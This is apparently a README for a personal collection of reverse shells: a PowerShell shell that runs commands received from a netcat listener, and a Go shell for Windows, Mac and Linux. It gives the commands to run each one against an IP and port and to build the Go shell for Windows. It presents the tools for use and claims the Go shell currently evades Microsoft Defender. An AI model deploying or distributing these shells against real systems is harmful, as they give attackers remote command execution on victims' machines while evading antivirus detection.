# My Reverse Shells

# Powershell
Native PowerShell reverse shell to a netcat listener.

Supports commands up to 16384 bytes in length, if you need longer than modify the line where the System.Byte[] object is declared.

This passes all commands entered from the netcat listener to PowerShell's Invoke-Expression, so this supports powershell + cmd.exe commands. Errors are sent over the socket

Usage:

<code>./pwsh_revshell.ps1</code>


<code>pwsh_revshell -ip 127.0.0.1 -port 3333</code>

# Golang

Golang reverse shell. Does runtime OS detection and selects propert shell for Windows, Mac, and Linux. Is not detected currently by Microsoft Defender.
To Compile:

Linux:

<code>go build  -ldflags="-s -w" -o revshell revshell.go</code>

Cross compile on Linux for Windows:

<code>GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o revshell.exe revshell.go</code>

To run, provide the IP address and port as command line arguments:

<code>./revshell 127.0.0.1 3333</code>

<code>revshell.exe 127.0.0.1 3333</code>
